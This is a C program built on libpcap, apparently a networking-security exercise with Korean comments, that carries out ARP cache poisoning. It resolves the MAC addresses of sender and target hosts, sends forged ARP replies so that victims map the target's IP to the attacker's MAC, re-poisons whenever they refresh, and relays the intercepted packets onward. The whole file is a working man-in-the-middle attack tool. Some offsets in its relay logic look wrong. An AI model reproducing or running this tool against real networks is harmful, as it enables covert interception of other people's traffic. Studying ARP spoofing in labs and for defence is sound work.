#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <uchar.h>
#include <time.h>

#define send_prot_addr	send_ip
#define trg_HW_addr		trg_hw
#define trg_prot_addr	trg_ip

uint32_t session_num;
uint8_t my_ip[4];
uint8_t my_mac[6];
uint8_t send_ip[101][4];
uint8_t trg_ip[101][4];
uint8_t send_mac[101][6];
uint8_t trg_mac[101][6];

typedef struct arp_header {
	uint8_t dst_addr[6];   //arp_req:FF~, arp_rep:mac
	uint8_t src_addr[6];
	uint16_t ethet_type;   //arp:0x0806
	uint16_t hw_type;
	uint16_t prot_type;    //IP4 0x0800
	uint8_t Hlen;          //이더넷 6
	uint8_t Plen;		   //IP4 4
	uint16_t op_code;      //arp_req:1, rep:2
	uint8_t send_HW_addr[6];
	uint8_t send_prot_addr[4];
	uint8_t trg_HW_addr[6];
	uint8_t trg_prot_addr[4];
}ARP;


void get_sender_mac(pcap_t *handle, uint32_t index)
{
	struct pcap_pkthdr *header;
	const uint8_t *data;
	while(1) {
		pcap_next_ex(handle, &header, &data);
		if(!memcmp(data+12, "\x08\x06", 2)) {
			if(!memcmp(data+28, send_ip[index], 4)){
				memcpy(send_mac[index], data +6, 6);
				printf("send_mac: %02x %02x %02x %02x %02x %02x\n", send_mac[index][0], send_mac[index][1], send_mac[index][2], send_mac[index][3], send_mac[index][4], send_mac[index][5]);
				break;
			}
		}
	}
}
void get_trg_mac(pcap_t *handle, uint32_t index)
{
	struct pcap_pkthdr *header;
	const uint8_t *data;
	while(1) {
		pcap_next_ex(handle, &header, &data);
		if(!memcmp(data+12, "\x08\x06", 2)) {
			if(!memcmp(data+28, trg_ip[index], 4)){
				memcpy(trg_mac[index], data +6, 6);
				printf("trg_mac: %02x %02x %02x %02x %02x %02x\n", trg_mac[index][0], trg_mac[index][1], trg_mac[index][2], trg_mac[index][3], trg_mac[index][4], trg_mac[index][5]);
				break;
			}
		}
	}
}

void send_arp_packet(pcap_t *handle, int opcode, uint8_t *send_hw, uint8_t *send_ip, uint8_t *trg_hw, uint8_t *trg_ip)
{
	ARP arp;
	memcpy(arp.dst_addr, (opcode == 1) ? (uint8_t *)"\xFF\xFF\xFF\xFF\xFF\xFF" : trg_hw, 6);
	memcpy(arp.src_addr, send_hw, 6);
	arp.ethet_type = ntohs(0x0806);
	arp.hw_type = ntohs(0x0001);
	arp.prot_type = ntohs(0x0800);
	arp.Hlen = 0x06;
	arp.Plen = 0x04;
	arp.op_code = ntohs(opcode);
	memcpy(arp.send_HW_addr, send_hw, 6);
	memcpy(arp.send_prot_addr, send_ip, 4);
	memcpy(arp.trg_HW_addr, (opcode == 1) ? (uint8_t *)"\x00\x00\x00\x00\x00\x00" : trg_hw, 6);
	memcpy(arp.trg_prot_addr, trg_ip, 4);

	pcap_sendpacket(handle, (const unsigned char*)&arp, sizeof(arp));
}

void find_myip()
{
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_in *sa;
	char *addr;
	int tmp = 0;
	getifaddrs(&ifap);
	for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr->sa_family == AF_INET) {
			sa = (struct sockaddr_in *) ifa->ifa_addr;
		}
	}
	memcpy(my_ip, &(sa->sin_addr.s_addr), 4);
	freeifaddrs(ifap);
}

void find_mymac()
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, "ens33");
	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(my_mac, s.ifr_hwaddr.sa_data, 6);
}


int main(int argc, char* argv[])
{
	char * dev, errbuf[PCAP_ERRBUF_SIZE];
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL)
	{
		fprintf(stderr, "기본 장치를 찾을 수 없습니다 : %s\n", errbuf);
		return (2);
	}
	printf("장치 : %s\n", dev);
	pcap_t * handle;
	struct pcap_pkthdr* header;
	const u_char* data;
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 10000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "%s\n 장치를 열 수 없습니다. : %s\n", dev, errbuf);
		return 2;
	}
	for(int i = 1; i < argc; i+=2){
		inet_pton(AF_INET, argv[i], send_ip[session_num]);
		inet_pton(AF_INET, argv[i+1], trg_ip[session_num]);
		session_num++;
	}
	find_myip();
	find_mymac();
	printf("my_ip: %u.%u.%u.%u\n", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
	printf("my_mac: %x %x %x %x %x %x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
	
	for(int i = 0; i < session_num; i++){
		send_arp_packet(handle, 1, my_mac, my_ip, NULL, send_ip[i]);
		send_arp_packet(handle, 1, my_mac, my_ip, NULL, send_ip[i]);
		get_sender_mac(handle, i);
		send_arp_packet(handle, 1, my_mac, my_ip, NULL, trg_ip[i]);
		send_arp_packet(handle, 1, my_mac, my_ip, NULL, trg_ip[i]);
		get_trg_mac(handle, i);
	}

	time_t sent_tm;
	int resend_chk = 0;
	while(1){
		if(resend_chk == 0){
			for(int i = 0; i < session_num; i++){
				send_arp_packet(handle, 2, my_mac, trg_ip[i], send_mac[i], send_ip[i]);
			}
			resend_chk = 1;
			sent_tm = time(NULL);
		}		

		while(1){
			int res = pcap_next_ex(handle, &header, &data);
			if(!memcmp(data+12, "\x08\x06", 2)){
				if(!memcmp(data+20, "\x01", 1)){
					for(int i = 0; i < session_num; i++){
						if(!memcmp(data+28, trg_ip[i], 4)){
							if(!memcmp(data, "\xff\xff\xff\xff\xff\xff", 6)){
								printf("target broadcast\n");
								resend_chk = 0;
								break;
							}
						}
						else if(!memcmp(data+28, send_ip[i], 4)){
							if(!memcmp(data+38, trg_ip[i], 4)){
								if(!memcmp(data, my_mac, 6)){
									printf("sender unicast\n");
									resend_chk = 0;
									break;
								}
							}
						}
					}		
				}
			}
			else{
				if(!memcmp(data+12, "\x08\x00", 2)){
					for(int i = 0; i < session_num; i++){
						if(!memcmp(data+28, send_ip[i], 4)){
							if(!memcmp(data+32, my_mac, 6)){
								uint8_t * now_data = (uint8_t *) data;
								for(int k = 0; k < 6; k++){
									now_data[6 + k] = my_mac[k];
								}
								for(int k = 0; k < 6; k++){
									now_data[k] = trg_mac[i][k];
								}
								pcap_sendpacket(handle, now_data, header->caplen);
							}
						}
					}
				}
			} 

			if(time(NULL) - sent_tm > 5 || resend_chk == 0){
				printf("resend\n");
				resend_chk = 0;
				break;
			}
		}
	}
	return 0;
}

